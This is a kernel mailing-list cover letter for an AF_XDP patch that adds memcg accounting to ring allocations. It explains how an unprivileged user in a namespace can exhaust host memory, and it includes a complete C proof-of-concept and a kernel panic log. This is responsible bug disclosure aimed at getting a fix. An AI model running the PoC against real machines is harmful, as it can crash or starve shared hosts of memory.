Received: from mail-pj1-f51.google.com (mail-pj1-f51.google.com [209.85.216.51])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 502C340A94A
	for <bpf@vger.kernel.org>; Fri, 31 Jul 2026 16:47:36 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.216.51
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1785516462; cv=none; b=UbD7sfh8+MlU58BYp/xQDfSdE/W/dxhO5PVhiGHzA6oN5XgYq/UwHk/Wql0DQ9B8PpkQMHi12b0WIC25Wzy057Y1ol+dJrVrMhNtF3vOnA/6IDiePeujBtJIeAh4Q0fxTHrDKMZ6CAWVLuNabWAQ9fqciF3mxjejo2QW25pkwks=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1785516462; c=relaxed/simple;
	bh=MM+ubInvq/2dLrqGKzVK5YMa+SHGQBDIGLqVBIPIjyQ=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=LO/WnSV/b9KCNKfK3B0+Bl5a/De6GWDC9eV+5HvQJ6x8sFZN0I0hHSqv0r+/gJ9nA2MvXEaTRO0puD4SakYb7wTtsNfuFgJ9BkjEfvUDUSRah0yHfjtT/fARa2awu/IXnwUCfUeKXjFVNY+b3qyAxc7VECrwzHdpmN5cOvnzq6M=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=FmqyHc8A; arc=none smtp.client-ip=209.85.216.51
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="FmqyHc8A"
Received: by mail-pj1-f51.google.com with SMTP id 98e67ed59e1d1-38a0c7e841fso1565751a91.2
        for <bpf@vger.kernel.org>; Fri, 31 Jul 2026 09:47:36 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=nebusec.ai; s=google; t=1785516455; x=1786121255; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=xTDdmk+uMh0QJbaZh1mGlHaDjpVbYM+/+eK8a4/Rxfk=;
        b=FmqyHc8AKx+9+R9u94C/6TnS3vSwNF3T9HCoHz43RIgec3sqjGOMbvx+7fhJ4KzDa/
         glb2pJavN20tyTr58gZF9jBLlyzXX/LnUfRu9JxuYRb6ItlzficGS7CYforomqvC8yku
         GPh3UPI6e2DpV5U1NVVOIgjX0X4y2djnPCGeRsVPFW2XdufTodWCUk4vj0KDI/QRJj4h
         f+mUh5Yu1pfSngYB0dOhqJ8QwX2kJ4h69iuj/thGNhGNuqxrj5fNa55aILNeE5N5XgRY
         1Qyi5frdH1fxnvfc8dC/wMLsnm44lXWDM2ZxS31mkubQw5m27t+j5imCt4U9S5FykajH
         5LBA==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1785516455; x=1786121255;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=xTDdmk+uMh0QJbaZh1mGlHaDjpVbYM+/+eK8a4/Rxfk=;
        b=hAmF7qos9Lnyoa9SwJzhrJgCKZ7vxu7spP4DIF9gh2AmCA6suvv2Opq5tDTrT19CP5
         DBT5Ly4FOWR9qMPIZtpJ629/bgYAocbSKAIZwp4EocGrAQGmSd+wXN6/3Z9K3kVWWNKu
         KkxeUq/Xx+DIyD2SRQDx02CYyvimzA0vRzpe6WpCDIUsyWYEkMtoXUZbKEWpTRCbbGDH
         0cq9Y6H/4XcGXyE3ThPeDhZu1a1pAUBy85wW/xiGBoGx3PrWyihVKZBzNwWewjA2eHxZ
         NfK2RUREBHQWD84GOIqhpTlnvGrWp+KdX6/2u3RRBybGBlPQHxhjp5jokLHqIx5AiEzK
         9zZA==
X-Forwarded-Encrypted: i=1; AHgh+RqvQ6v/qHpURyqtCARrIhQdRlrkn2WIK0NH/qYd22aEAbgcSO6qkDgCkX6PcVn0nEnEJ0Q=@vger.kernel.org
X-Gm-Message-State: AOJu0YzrB9qONrZo9OTkRUi61437baQH2B5N2nstBFRHUtUkWudIFp2r
	SbCXrGGWd25yi/pPJoKQ1xmv5kegeGbP9Bv5BsrY3VyvfavkzL5FoQ4Sj0QPw5+0Smjq
X-Gm-Gg: AR+sD12OWNtzc4GU1kep+JQl6WqOrT/odggcMFHoFLzFYokIjmI1oIovDi9gW1K9oEi
	MMeEwpRb3Uv0C4qsTwxG+i88Xf7Bb53jVtEybVh2jLb+HILgPmAmjs2YA/vWvpLQ7VC3osII9sZ
	AcggaiQrufFT/RKufFZY2mzCGuAcX85F6grxwttR/y9nyrEGF8UZ9a9lozGXaE+jvfAaloPzG1s
	XhgkGAzObD3ewBfqCWqq8o9EkNJLaZodIWfZnYeqPmO1Dl0WDuq53Y21KqIzOrqWNKYY62SYUVL
	npqR7ARkUIV35YWnNzSi+2QQzI3MHAWYw5mYsgMJIPaI9JATaBpvCi4ZyygOLT1jyEnQtohuSYl
	zXwBL75mcYvtndoAt0tganC7ItuJSaXfwPIMBYGhwvA7oEBIhKf7vpA7hx7IdjwOHf6cADKJyRK
	9/uLCCPx8peCukQy0+FACT6EmvMQZCYsoyM7LDD+epAXWAVz/pkEEVgruoWszI79KJ0dwE7R8b3
	pNvxyn3Pg==
X-Received: by 2002:a17:90b:288d:b0:38e:49c0:75a7 with SMTP id 98e67ed59e1d1-38fbc3e7db6mr609404a91.8.1785516455119;
        Fri, 31 Jul 2026 09:47:35 -0700 (PDT)
Received: from localhost.localdomain ([115.192.250.185])
        by smtp.gmail.com with ESMTPSA id 98e67ed59e1d1-38fb2b551b9sm451299a91.2.2026.07.31.09.47.30
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Fri, 31 Jul 2026 09:47:34 -0700 (PDT)
From: Zihan Xi <zihanx@nebusec.ai>
To: netdev@vger.kernel.org,
	bpf@vger.kernel.org
Cc: magnus.karlsson@intel.com,
	maciej.fijalkowski@intel.com,
	sdf@fomichev.me,
	davem@davemloft.net,
	edumazet@google.com,
	pabeni@redhat.com,
	horms@kernel.org,
	ast@kernel.org,
	daniel@iogearbox.net,
	hawk@kernel.org,
	john.fastabend@gmail.com,
	vega@nebusec.ai,
	zihanx@nebusec.ai
Subject: [PATCH net v3 0/1] xsk: account uncharged AF_XDP ring allocations to memcg
Date: Fri, 31 Jul 2026 16:46:22 +0000
Message-ID: <20260731164623.4694-1-zihanx@nebusec.ai>
X-Mailer: git-send-email 2.47.3
Precedence: bulk
X-Mailing-List: bpf@vger.kernel.org
List-Id: <bpf.vger.kernel.org>
List-Subscribe: <mailto:bpf+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:bpf+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

Hi Linux kernel maintainers,

We found and validated a issue in net/xdp/xsk_queue.c. The bug is reachable by a
non-root user via user and net namespace.
We've tested it, and it should not affect any other functionality.

We will provide detailed information about the bug
in this email, along with a PoC to trigger it.

---- details below ----

Bug details:

AF_XDP lets user space allocate RX, TX, UMEM fill and UMEM completion
rings with setsockopt() and mmap them into the process. The shared
xskq_create() helper allocates the ring backing memory, but this
user-controlled and long-lived allocation is not charged as kmem to the
allocating memory cgroup.

As a result, a task with CAP_NET_RAW in a user and network namespace can
request very large AF_XDP rings before bind or any packet I/O, while the
allocation is not attributed to memcg/kmem. In the original repro the
resulting global OOM ended in a panic because that guest had
panic_on_oom enabled. The panic was only the environment-specific final
outcome; the underlying issue for this version is the missing memcg
accounting on the mmapable AF_XDP ring backing allocation.

The first version tried to bound these allocations with sysctl_optmem_max,
and v2 tried to account them to RLIMIT_MEMLOCK / user->locked_vm. Based
on review feedback, v3 drops that AF_XDP-specific manual accounting and
uses the memcg/kmem ownership model instead. It keeps the same VM_USERMAP
vmalloc semantics as vmalloc_user(), but passes GFP_KERNEL_ACCOUNT so the
ring backing pages are attributed to the allocating memory cgroup and can
be constrained by existing cgroup memory limits.

The root cause is older than the later vmalloc_user() conversion: the
shared mmapable ring backing allocation was introduced without this
resource accounting, and b9b6b68e8abd later added the RX ring user of the
same helper. The current code path uses vmalloc_user(), so this patch
accounts that VM_USERMAP allocation path while keeping the historical
Fixes tag on the first commit that made the mmapable queue allocation
root-cause fact true.

For the earlier memcg experiment, the issue was not a missing
GFP_ACCOUNT flag in the prototype: the local log showed the allocation
reaching __vmalloc_node_range_noprof() with GFP_KERNEL_ACCOUNT set. That
run was in the root / effectively unlimited memcg, so the change affected
attribution but did not create a new limit boundary in that environment.
This version therefore treats memcg policy as the enforcement boundary
and only fixes the missing kmem accounting in the AF_XDP allocation path.

Reproducer:

    gcc -O2 -static -o poc poc.c
    unshare -Urn ./poc

We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.

------BEGIN poc.c------
#define _GNU_SOURCE
#include <errno.h>
#include <linux/if_xdp.h>
#include <netinet/in.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/resource.h>
#include <sys/socket.h>
#include <sys/sysinfo.h>
#include <unistd.h>

static void print_meminfo(const char *tag)
{
	struct sysinfo info;

	if (sysinfo(&info) == 0) {
		unsigned long long total = (unsigned long long)info.totalram * info.mem_unit;
		unsigned long long free = (unsigned long long)info.freeram * info.mem_unit;
		unsigned long long avail = (unsigned long long)info.bufferram * info.mem_unit;

		fprintf(stderr,
			"%s: total=%llu MiB free=%llu MiB buff=%llu MiB\n",
			tag, total >> 20, free >> 20, avail >> 20);
	}
}

static int set_ring(int fd, int optname, unsigned int entries, const char *name)
{
	int ret;

	ret = setsockopt(fd, SOL_XDP, optname, &entries, sizeof(entries));
	if (ret) {
		fprintf(stderr, "setsockopt(%s, %u) failed: %s\n",
			name, entries, strerror(errno));
		return -1;
	}

	fprintf(stderr, "allocated %s ring with %u entries on fd=%d\n",
		name, entries, fd);
	return 0;
}

int main(int argc, char **argv)
{
	static const struct {
		int optname;
		const char *name;
	} rings[] = {
		{ XDP_RX_RING, "XDP_RX_RING" },
		{ XDP_TX_RING, "XDP_TX_RING" },
		{ XDP_UMEM_FILL_RING, "XDP_UMEM_FILL_RING" },
		{ XDP_UMEM_COMPLETION_RING, "XDP_UMEM_COMPLETION_RING" },
	};
	unsigned int entries = 1U << 25;
	int nsockets = 8;
	int *fds;
	int i, j;

	if (argc > 1)
		entries = strtoul(argv[1], NULL, 0);
	if (argc > 2)
		nsockets = atoi(argv[2]);
	if (!entries || !nsockets) {
		fprintf(stderr, "usage: %s [entries power-of-two] [socket_count]\n",
			argv[0]);
		return 1;
	}

	fds = calloc(nsockets, sizeof(*fds));
	if (!fds) {
		perror("calloc");
		return 1;
	}

	fprintf(stderr,
		"AF_XDP ring exhaustion PoC: entries=%u sockets=%d pid=%d\n",
		entries, nsockets, getpid());
	print_meminfo("before");

	for (i = 0; i < nsockets; i++) {
		fds[i] = socket(AF_XDP, SOCK_RAW, 0);
		if (fds[i] < 0) {
			fprintf(stderr, "socket(AF_XDP) failed at index %d: %s\n",
				i, strerror(errno));
			break;
		}

		fprintf(stderr, "opened AF_XDP socket %d fd=%d\n", i, fds[i]);
		for (j = 0; j < (int)(sizeof(rings) / sizeof(rings[0])); j++) {
			if (set_ring(fds[i], rings[j].optname, entries, rings[j].name))
				goto out;
			print_meminfo(rings[j].name);
		}
	}

out:
	fprintf(stderr, "holding allocations open; press Ctrl-C or wait\n");
	sleep(600);

	for (i = 0; i < nsockets; i++) {
		if (fds[i] >= 0)
			close(fds[i]);
	}
	free(fds);
	return 0;
}
------END poc.c--------

----BEGIN crash log----
[  112.547501][  T953] Kernel panic - not syncing: Out of memory: system-wide panic_on_oom is enabled
[  112.548314][  T953] CPU: 2 UID: 1028 PID: 953 Comm: poc Not tainted 6.12.95 #1 7b931b951f26d30ef9f3f8d44b931a24dbfb5ce6
[  112.549150][  T953] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[  112.550090][  T953] Call Trace:
[  112.550346][  T953]  <TASK>
[  112.550569][  T953]  panic (kernel/panic.c:1101)
[  112.550876][  T953]  ? __pfx_panic (include/linux/nmi.h:163)
[  112.551222][  T953]  ? __pfx_lock_release+0x10/0x10
[  112.551642][  T953]  out_of_memory (mm/oom_kill.c:1193)
[  112.552013][  T953]  ? __alloc_pages_slowpath.constprop.0+0xa0f/0x2800
[  112.552538][  T953]  ? __pfx_out_of_memory (mm/oom_kill.c:835)
[  112.552919][  T953]  ? __pfx_mutex_trylock (kernel/locking/mutex.c:582 (discriminator 1))
[  112.553335][  T953]  __alloc_pages_slowpath.constprop.0+0x1eb8/0x2800
[  112.553854][  T953]  ? srso_alias_return_thunk (arch/x86/lib/retpoline.S:220)
[  112.554295][  T953]  ? __pfx___alloc_pages_slowpath.constprop.0+0x10/0x10
[  112.554819][  T953]  ? local_clock_noinstr (kernel/sched/clock.c:307 (discriminator 1))
[  112.555214][  T953]  ? lock_release+0x687/0xc90
[  112.555584][  T953]  ? __pfx___might_resched+0x10/0x10
[  112.556006][  T953]  __alloc_pages_noprof (mm/page_alloc.c:5221 (discriminator 1))
[  112.556409][  T953]  ? __pfx___alloc_pages_noprof (mm/page_alloc.c:4967)
[  112.556860][  T953]  alloc_pages_mpol_noprof+0x1b1/0x430
[  112.557289][  T953]  ? __pfx_alloc_pages_mpol_noprof+0x10/0x10
[  112.557759][  T953]  ? __pfx___might_resched+0x10/0x10
[  112.558179][  T953]  __vmalloc_node_range_noprof (include/linux/workqueue.h:699 include/linux/workqueue.h:760 mm/vmalloc.c:3801 mm/vmalloc.c:3941 mm/vmalloc.c:4082)
[  112.558628][  T953]  ? xskq_create (include/linux/refcount.h:291 include/linux/refcount.h:366 include/linux/refcount.h:383 include/net/sock.h:839 net/xdp/xsk_queue.c:61)
[  112.558990][  T953]  ? __pfx___vmalloc_node_range_noprof (mm/vmalloc.c:4143 (discriminator 2))
[  112.559508][  T953]  ? srso_alias_return_thunk (arch/x86/lib/retpoline.S:220)
[  112.559950][  T953]  ? xskq_create (include/linux/refcount.h:291 include/linux/refcount.h:366 include/linux/refcount.h:383 include/net/sock.h:839 net/xdp/xsk_queue.c:61)
[  112.560346][  T953]  vmalloc_user_noprof (mm/vmalloc.c:4484 (discriminator 4))
[  112.560731][  T953]  ? xskq_create (include/linux/refcount.h:291 include/linux/refcount.h:366 include/linux/refcount.h:383 include/net/sock.h:839 net/xdp/xsk_queue.c:61)
[  112.561096][  T953]  xskq_create (include/linux/refcount.h:291 include/linux/refcount.h:366 include/linux/refcount.h:383 include/net/sock.h:839 net/xdp/xsk_queue.c:61)
[  112.561434][  T953]  xsk_setsockopt (net/xdp/xsk.c:1198)
[  112.561799][  T953]  ? srso_alias_return_thunk (arch/x86/lib/retpoline.S:220)
[  112.562227][  T953]  ? aa_sk_perm+0x131/0x8a0
[  112.562573][  T953]  ? __pfx_xsk_setsockopt (include/linux/refcount.h:461)
[  112.562975][  T953]  ? security_file_permission (security/security.c:2424 (discriminator 18))
[  112.563420][  T953]  ? srso_alias_return_thunk (arch/x86/lib/retpoline.S:220)
[  112.563850][  T953]  ? vfs_write (fs/read_write.c:799)
[  112.564222][  T953]  do_sock_setsockopt (net/socket.c:395)
[  112.564610][  T953]  ? __pfx_do_sock_setsockopt (net/socket.c:282 (discriminator 1))
[  112.565046][  T953]  ? srso_alias_return_thunk (arch/x86/lib/retpoline.S:220)
[  112.565490][  T953]  ? srso_alias_return_thunk (arch/x86/lib/retpoline.S:220)
[  112.565926][  T953]  ? __do_sys_sysinfo (kernel/sys.c:2202)
[  112.566333][  T953]  ? __pfx___do_sys_sysinfo (kernel/sys.c:3073)
[  112.566758][  T953]  __sys_setsockopt (net/socket.c:2396)
[  112.567144][  T953]  __x64_sys_setsockopt (arch/x86/include/asm/compat.h:94 (discriminator 1) arch/x86/include/asm/compat.h:100 (discriminator 1) net/socket.c:2505 (discriminator 1))
[  112.567538][  T953]  ? srso_alias_return_thunk (arch/x86/lib/retpoline.S:220)
[  112.567967][  T953]  ? trace_hardirqs_on+0x5b/0x110
[  112.568366][  T953]  do_syscall_64 (arch/x86/include/asm/entry-common.h:43 (discriminator 3) include/linux/irq-entry-common.h:100 (discriminator 3) include/linux/entry-common.h:174 (discriminator 3) arch/x86/entry/syscall_64.c:89 (discriminator 3))
[  112.568721][  T953]  entry_SYSCALL_64_after_hwframe (arch/x86/entry/entry_64.S:121)
[  112.569187][  T953] RIP: 0033:0x7e2b01ae42ba
[  112.569541][  T953] Code: 48 83 ec 10 48 63 c9 48 63 ff 45 89 c9 6a 2c e8 fc d3 f7 ff 48 83 c4 18 c3 0f 1f 80 00 00 00 00 49 89 ca b8 36 00 00 00 0f 05 <48> 3d 00 f0 ff ff 77 06 c3 0f 1f 44 00 00 48 8b 15 21 2b 0d 00 f7
All code
========
   0:	48 83 ec 10          	sub    $0x10,%rsp
   4:	48 63 c9             	movslq %ecx,%rcx
   7:	48 63 ff             	movslq %edi,%rdi
   a:	45 89 c9             	mov    %r9d,%r9d
   d:	6a 2c                	push   $0x2c
   f:	e8 fc d3 f7 ff       	call   0xfffffffffff7d410
  14:	48 83 c4 18          	add    $0x18,%rsp
  18:	c3                   	ret
  19:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  20:	49 89 ca             	mov    %rcx,%r10
  23:	b8 36 00 00 00       	mov    $0x36,%eax
  28:	0f 05                	syscall
  2a:*	48 3d 00 f0 ff ff    	cmp    $0xfffffffffffff000,%rax		<-- trapping instruction
  30:	77 06                	ja     0x38
  32:	c3                   	ret
  33:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  38:	48 8b 15 21 2b 0d 00 	mov    0xd2b21(%rip),%rdx        # 0xd2b60
  3f:	f7                   	.byte 0xf7

Code starting with the faulting instruction
===========================================
   0:	48 3d 00 f0 ff ff    	cmp    $0xfffffffffffff000,%rax
   6:	77 06                	ja     0xe
   8:	c3                   	ret
   9:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   e:	48 8b 15 21 2b 0d 00 	mov    0xd2b21(%rip),%rdx        # 0xd2b36
  15:	f7                   	.byte 0xf7
[  112.571019][  T953] RSP: 002b:00007ffc66ef6958 EFLAGS: 00000283 ORIG_RAX: 0000000000000036
[  112.571683][  T953] RAX: ffffffffffffffda RBX: 000055d2e378619e RCX: 00007e2b01ae42ba
[  112.572300][  T953] RDX: 0000000000000005 RSI: 000000000000011b RDI: 0000000000000003
[  112.572901][  T953] RBP: 0000000000000000 R08: 0000000000000004 R09: 0000000000000000
[  112.573505][  T953] R10: 00007ffc66ef697c R11: 0000000000000283 R12: 000055d2e3787dc0
[  112.574127][  T953] R13: 0000000004000000 R14: 00007ffc66ef697c R15: 0000000000000003
[  112.574744][  T953]  </TASK>
[  112.575596][  T953] Kernel Offset: disabled
[  112.575937][  T953] Rebooting in 10 seconds..
-----END crash log-----

Best regards,
Zihan Xi

changes in v3:
  - drop the v2 RLIMIT_MEMLOCK / user->locked_vm accounting approach
    after review feedback
  - switch the AF_XDP ring backing allocation to the memcg/kmem model by
    using a VM_USERMAP vmalloc path with GFP_KERNEL_ACCOUNT
  - include <asm/shmparam.h> explicitly for SHMLBA, matching the
    vmalloc implementation's dependency
  - clarify that panic_on_oom was only the final observable outcome and
    that cgroup memory limits are the enforcement boundary for v3
  - retarget Fixes to 423f38329d26, the original mmapable queue
    allocation that introduced the missing accounting root-cause fact
  - v2 Link: https://lore.kernel.org/all/20260730153832.11238-1-zihanx@nebusec.ai/
changes in v2:
  - replace the socket optmem limit proposal with RLIMIT_MEMLOCK /
    user->locked_vm accounting via mm_account_pinned_pages()
  - drop the earlier socket/pool lifetime coupling changes and keep the
    final code diff limited to xsk_queue.c and xsk_queue.h
  - clarify that panic_on_oom only affected the observed end result, while
    the bug is the missing resource boundary for ring allocations
  - explain why memcg attribution alone was not sufficient as the default
    enforcement boundary in the validated setup
  - v1 Link: https://lore.kernel.org/all/cover.1785313094.git.zihanx@nebusec.ai/

Zihan Xi (1):
  xsk: account ring allocations to memcg

 net/xdp/xsk_queue.c | 12 +++++++++++-
 1 file changed, 11 insertions(+), 1 deletion(-)

-- 
2.43.0
